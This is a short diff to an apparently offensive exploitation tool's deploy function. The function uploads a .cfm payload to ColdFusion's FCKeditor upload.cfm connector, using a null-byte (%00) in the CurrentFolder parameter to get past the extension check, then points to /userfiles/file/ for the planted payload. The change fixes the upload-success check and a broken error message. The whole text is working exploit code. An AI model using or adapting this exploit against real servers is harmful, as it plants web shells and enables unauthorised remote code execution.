@@ -34,9 +34,10 @@ def deploy(fingerengine, fingerprint):
     
     uri = "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm"        
     uri += "?Command=FileUploads&Type=File&CurrentFolder=/{0}%00".format(cfm_name)
+
     response = utility.requests_post(url + uri, files=payload)
-    if response.status_code == 200 and "" in response.content: 
+    if response.status_code == 200 and "OnUploadCompleted" in response.content: 
         utility.Msg("Deployed.  Access /userfiles/file/{0} for payload"\
                             .format(cfm_name), LOG.SUCCESS)
     else:
-        utility.Msg("Could not write payload (HTTP %d) (%s)" % (response.status_code))
+        utility.Msg("Could not write payload (HTTP %d)" % (response.status_code))
